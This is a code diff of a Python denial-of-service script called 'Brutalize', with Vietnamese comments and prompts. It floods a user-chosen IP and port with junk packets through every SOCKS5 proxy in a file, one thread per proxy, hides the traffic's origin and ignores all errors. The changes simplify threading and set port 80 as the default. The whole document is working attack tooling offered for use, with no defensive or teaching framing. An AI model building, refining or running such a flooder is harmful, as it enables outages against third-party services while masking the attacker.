@@ -1,19 +1,17 @@
 import socks
 import socket
-import random
 import threading
 import time
 
 class Brutalize:
-    def __init__(self, ip, port, force, threads):
+    def __init__(self, ip, port, force):
         self.ip = ip
-        self.port = port if port else random.randint(1, 65535)
+        self.port = port if port else 80
         self.force = force
-        self.threads = threads
         self.on = False
         self.sent = 0
         self.proxies = self.load_proxies()
-        self.data = str.encode("x" * self.force)
+        self.data = str.encode("X" * self.force)
 
     def load_proxies(self):
         """ Đọc danh sách proxy SOCKS5 từ file proxy_socks5.txt """
@@ -42,19 +40,17 @@ class Brutalize:
             return None
 
     def flood(self):
-        """ Bắt đầu tấn công """
+        """ Bắt đầu tấn công với toàn bộ proxy """
         self.on = True
-        print(f"[+] Bắt đầu tấn công {self.ip}:{self.port} bằng toàn bộ proxy SOCKS5...")
+        print(f"[+] Bắt đầu tấn công {self.ip}:{self.port} bằng toàn bộ proxy...")
 
-        proxy_count = len(self.proxies)
-        for i in range(self.threads):
-            proxy = self.proxies[i % proxy_count]  # Sử dụng từng proxy lần lượt
+        for proxy in self.proxies:
             threading.Thread(target=self.send, args=(proxy,)).start()
 
         threading.Thread(target=self.info).start()
 
     def send(self, proxy):
-        """ Gửi gói tin qua proxy SOCKS5 """
+        """ Gửi gói tin liên tục qua proxy SOCKS5 """
         while self.on:
             try:
                 sock = self.get_proxy_socket(proxy)
@@ -62,8 +58,8 @@ class Brutalize:
                     sock.sendto(self.data, (self.ip, self.port))
                     self.sent += len(self.data)
                     sock.close()
-            except Exception:
-                pass
+            except:
+                pass  # Bỏ qua lỗi và tiếp tục
 
     def info(self):
         """ Hiển thị tốc độ tấn công """
@@ -88,16 +84,13 @@ def main():
         print("[-] Lỗi! Vui lòng nhập IP hợp lệ.")
         return
 
-    port = input("Nhập port (Enter để chọn ngẫu nhiên): ")
-    port = int(port) if port.isdigit() else None
+    port = input("Nhập port (Enter để mặc định 80): ")
+    port = int(port) if port.isdigit() else 80
 
     force = input("Bytes per packet (Enter để mặc định 1250): ")
     force = int(force) if force.isdigit() else 1250
 
-    threads = input("Nhập số luồng (Enter để mặc định 100): ")
-    threads = int(threads) if threads.isdigit() else 100
-
-    brute = Brutalize(ip, port, force, threads)
+    brute = Brutalize(ip, port, force)
     try:
         brute.flood()
         while True:
